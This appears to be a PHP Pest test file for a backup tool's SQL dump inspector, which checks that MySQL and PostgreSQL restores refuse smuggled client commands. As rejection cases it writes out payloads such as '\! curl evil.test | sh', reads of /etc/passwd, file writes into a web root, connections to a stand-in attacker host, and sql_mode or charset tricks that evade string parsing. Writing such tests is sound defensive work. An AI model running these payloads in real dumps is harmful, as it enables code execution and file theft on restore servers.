<?php

declare(strict_types=1);

use Nyoncode\BackupManager\Archive\Tar\TarHeader;
use Nyoncode\BackupManager\Exceptions\BackupManagerException;
use Nyoncode\BackupManager\Exceptions\RestoreException;
use Nyoncode\BackupManager\Support\SqlDumpInspector;

function dumpFile(string $contents): string
{
    $path = tempnam(sys_get_temp_dir(), 'bm-dump-');
    file_put_contents($path, $contents);

    return $path;
}

const MYSQLDUMP = <<<'SQL'
-- MySQL dump 10.13  Distrib 8.0.36, for Linux (x86_64)
--
-- Host: 127.0.0.1    Database: app
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40103 SET TIME_ZONE='+00:00' */;
DROP TABLE IF EXISTS `posts`;
CREATE TABLE `posts` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `source` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB;
INSERT INTO `posts` VALUES (1,'it\'s a \\! literal and a \n newline'),(2,'C:\\path\\file'),(3,"dq \" ok");
/* a plain comment with \! inside */
# a hash comment \! too
DELIMITER ;;
/*!50003 CREATE*/ /*!50003 TRIGGER `t` BEFORE INSERT ON `posts` FOR EACH ROW SET NEW.source = 'x' */;;
DELIMITER ;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
SQL;

const PGDUMP = <<<'SQL'
--
-- PostgreSQL database dump
--
\restrict Ab3dEf9
SET statement_timeout = 0;
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
CREATE FUNCTION public.f() RETURNS text
    LANGUAGE plpgsql
    AS $_$
BEGIN
  RETURN 'a \! b';
END;
$_$;
CREATE FUNCTION public.g() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$;
/* nested /* comment \! */ still comment */
COPY public.posts (id, body) FROM stdin;
1	a \\! tab\there
2	\N
\.
INSERT INTO public.posts (body) VALUES (E'escaped \' quote and \\! text');
\connect -reuse-previous=on "dbname='app'"
\unrestrict Ab3dEf9
SQL;

it('accepts a real-shaped mysqldump', function (): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile(MYSQLDUMP));
})->throwsNoExceptions();

it('accepts a real-shaped pg_dump', function (): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile(PGDUMP));
})->throwsNoExceptions();

it('refuses mysql client commands outside strings', function (string $payload): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile(MYSQLDUMP."\n".$payload."\n"));
})->with([
    'shell' => ['\\! curl evil.test | sh'],
    'shell mid-line' => ['SELECT 1; \\! id'],
    'named system' => ['system id'],
    'source file' => ['source /etc/passwd'],
    'tee' => ['tee /var/www/public/x.php'],
    'after a closed string' => ["INSERT INTO t VALUES ('ok'); \\. /etc/hosts"],
])->throws(RestoreException::class);

it('refuses psql meta-commands outside strings and COPY data', function (string $payload): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile(PGDUMP."\n".$payload."\n"));
})->with([
    'shell' => ['\\! curl evil.test | sh'],
    'output to file' => ['\\o /var/www/public/x.php'],
    'include' => ['\\i /etc/passwd'],
    'chained after connect' => ['\\connect app \\! id'],
    'after a dollar body' => ['SELECT $$x$$; \\! id'],
    'stray terminator' => ['\\.'],
])->throws(RestoreException::class);

it('does not mistake a dollar inside an identifier for a dollar quote', function (): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile("SELECT a\$b\$ FROM t;\n\\! id\n"));
})->throws(RestoreException::class);

it('does not mistake a column on its own line inside a routine body for a client command', function (): void {
    $dump = <<<'SQL'
DELIMITER ;;
CREATE PROCEDURE `touch_sources`()
BEGIN
  UPDATE `posts` SET
    source = 'x',
    system = 1
  WHERE id > 0;
END ;;
DELIMITER ;
UPDATE `posts` SET
  source = 'y';
SQL;

    SqlDumpInspector::assertSafeForMysql(dumpFile($dump));
})->throwsNoExceptions();

it('still refuses a named command once the previous statement has ended', function (): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile("DELIMITER ;;\nCREATE PROCEDURE p() BEGIN SELECT 1; END ;;\nDELIMITER ;\nsystem id\n"));
})->throws(RestoreException::class);

it('refuses a tar size field that overflows', function (): void {
    TarHeader::decodeSize(chr(0x80).str_repeat(chr(0xFF), 11));
})->throws(BackupManagerException::class, 'overflows');

it('accepts the sql_mode handling mysqldump itself writes', function (): void {
    $dump = <<<'SQL'
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40101 SET NAMES utf8mb4 */;
DELIMITER ;;
/*!50003 SET @saved_sql_mode       = @@sql_mode */ ;;
/*!50003 SET sql_mode              = 'ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION' */ ;;
/*!50003 CREATE*/ /*!50003 TRIGGER `t` BEFORE INSERT ON `posts` FOR EACH ROW SET NEW.source = 'x' */;;
/*!50003 SET sql_mode              = @saved_sql_mode */ ;;
DELIMITER ;
/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
SQL;

    SqlDumpInspector::assertSafeForMysql(dumpFile($dump));
})->throwsNoExceptions();

it('refuses a dump that changes how the mysql client reads strings', function (string $payload): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile($payload."\nSELECT 'a\\'; \\! id;\n"));
})->with([
    'no backslash escapes' => ["SET sql_mode = 'NO_BACKSLASH_ESCAPES';"],
    'ansi quotes' => ["SET SESSION sql_mode='ANSI_QUOTES';"],
    'via a variable' => ["SET @m = 'NO_BACKSLASH_ESCAPES'; SET sql_mode = @m;"],
    'poisoned saved mode' => ["SET @saved_sql_mode = 'NO_BACKSLASH_ESCAPES';"],
    'multibyte charset' => ['SET NAMES sjis;'],
])->throws(RestoreException::class);

it('refuses a named command once a multi-line string has closed and the statement ended', function (): void {
    // The old line-based check thought a statement was still pending here.
    SqlDumpInspector::assertSafeForMysql(dumpFile("INSERT INTO t VALUES ('a\nb;');\nsystem id\n"));
})->throws(RestoreException::class);

it('does not take a line inside a multi-line string for a client command', function (): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile("INSERT INTO t VALUES ('first;\nsource of truth');\n"));
})->throwsNoExceptions();

it('refuses a dump that changes how psql reads strings or reaches another server', function (string $payload): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile($payload."\n"));
})->with([
    'standard strings off' => ["SET standard_conforming_strings = off;\nSELECT 'a\\'; \\! id;"],
    'via set_config' => ["SELECT set_config('standard_conforming_strings', 'off', false);"],
    'multibyte encoding' => ["SET client_encoding = 'SJIS';"],
    'connect to a host' => ['\\connect "host=evil.test dbname=x"'],
    'connect positional host' => ['\\c app postgres evil.test'],
    'copy not at end of line' => ["COPY t (a) FROM stdin; SELECT 1;\n\\! id\n\\."],
    'commented-out copy' => ["-- COPY t (a) FROM stdin;\n\\! id"],
])->throws(RestoreException::class);

it('reads an identifier ending in e as an identifier, not an E string prefix', function (): void {
    // `name'…'` is not an escape string; the backslash before the quote is data
    // and the string ends there, so the meta-command after it is refused.
    SqlDumpInspector::assertSafeForPsql(dumpFile("SELECT name'\\'; \\! id\n"));
})->throws(RestoreException::class);

it('refuses every way around the sql_mode allow-list', function (string $payload): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile($payload."\n"));
})->with([
    'prepared' => ["PREPARE s FROM 'SET sql_mode=''NO_BACKSLASH_ESCAPES'''; EXECUTE s;"],
    'select into the saved variable' => ['SELECT \'NO_BACKSLASH_ESCAPES\' INTO @saved_sql_mode;'],
    'adjacent literals' => ["SET sql_mode = 'STRICT' 'NO_BACKSLASH_ESCAPES';"],
    'set statement' => ["SET STATEMENT sql_mode='NO_BACKSLASH_ESCAPES' FOR SELECT 1;"],
    'inside a routine' => ["DELIMITER ;;\nCREATE PROCEDURE p() BEGIN SET sql_mode='ANSI_QUOTES'; END;;\nDELIMITER ;"],
    'poisoned saved charset' => ["SET @saved_cs_client = 'sjis';"],
    'unlisted charset' => ['SET NAMES gbk;'],
])->throws(RestoreException::class);

it('leaves a table with a multibyte server charset alone', function (): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile("CREATE TABLE t (a TEXT) DEFAULT CHARSET=sjis;\n"));
})->throwsNoExceptions();

it('refuses every way around the psql encoding and string allow-list', function (string $payload): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile($payload."\n"));
})->with([
    'alter database' => ['ALTER DATABASE app SET standard_conforming_strings = off;'],
    'set_config encoding' => ["SELECT set_config('client_encoding', 'SJIS', false);"],
    'encoding spelled oddly' => ["SET client_encoding = 'Shift-JIS';"],
    'local' => ['SET LOCAL standard_conforming_strings = off;'],
])->throws(RestoreException::class);

it('accepts the encodings pg_dump writes', function (string $encoding): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile("SET client_encoding = '{$encoding}';\n"));
})->with(['UTF8', 'LATIN1', 'EUC_JP', 'WIN1250', 'SQL_ASCII'])->throwsNoExceptions();

it('judges every statement of a batch and every spelling of a name', function (string $payload): void {
    SqlDumpInspector::assertSafeForMysql(dumpFile($payload."\n"));
})->with([
    'charset in a batch' => ["DELIMITER ;;\nSELECT 1; SET NAMES sjis;;\nDELIMITER ;"],
    'prepare in a batch' => ["DELIMITER ;;\nSELECT 1; PREPARE s FROM @q;;\nDELIMITER ;"],
    'backticked sql_mode' => ['SET @@`sql_mode` = @m;'],
    'backticked saved variable' => ["SET @`saved_sql_mode` = 'NO_BACKSLASH_ESCAPES';"],
    'call a routine' => ['CALL p();'],
    'charset via a variable' => ["SET @x = 'sjis'; SET NAMES @x;"],
    'charset assignment mid-statement' => ['SELECT 1 FROM t WHERE (@@character_set_client := 0);'],
])->throws(RestoreException::class);

it('finds psql settings in quoted identifiers and DO bodies', function (string $payload): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile($payload."\n"));
})->with([
    'quoted identifier' => ['SET "standard_conforming_strings" = off;'],
    'do block' => ["DO \$\$ BEGIN PERFORM set_config('standard_conforming_strings', 'off', false); END \$\$;"],
    'do block encoding' => ["DO \$x\$ BEGIN EXECUTE 'SET client_encoding = ''SJIS'''; END \$x\$;"],
])->throws(RestoreException::class);

it('closes the third round of spellings', function (string $driver, string $payload): void {
    $driver === 'mysql'
        ? SqlDumpInspector::assertSafeForMysql(dumpFile($payload."\n"))
        : SqlDumpInspector::assertSafeForPsql(dumpFile($payload."\n"));
})->with([
    'quoted user variable' => ['mysql', "SET @'saved_sql_mode' = 'NO_BACKSLASH_ESCAPES';"],
    'into without a space' => ['mysql', "SELECT 'x' INTO@v;"],
    'charset shape' => ['mysql', 'SET character_set_client = utf8mb4, @x := 1;'],
    'charset by expression' => ['mysql', "SET character_set_client = CONCAT('sj','is');"],
    'unicode escape' => ['pgsql', 'SET U&"standard_conforming_string\\0073" = off;'],
    'do block' => ['pgsql', 'DO $$ BEGIN NULL; END $$;'],
    'other set_config' => ['pgsql', "SELECT set_config('application_name', 'x', false);"],
])->throws(RestoreException::class);

it('allows only the top-level SELECTs pg_dump writes', function (string $payload): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile($payload."\n"));
})->with([
    'own function' => ['SELECT evil();'],
    'catalog with a call inside' => ['SELECT pg_catalog.setval(evil()::regclass, 1, false);'],
    'pg_settings' => ["UPDATE pg_settings SET setting = 'off' WHERE name = 'standard_conforming_strings';"],
])->throws(RestoreException::class);

it('accepts the SELECTs pg_dump writes', function (string $payload): void {
    SqlDumpInspector::assertSafeForPsql(dumpFile($payload."\n"));
})->with([
    ["SELECT pg_catalog.set_config('search_path', '', false);"],
    ["SELECT pg_catalog.setval('public.posts_id_seq', 2, true);"],
    ["SELECT pg_catalog.lo_create('16384');"],
])->throwsNoExceptions();
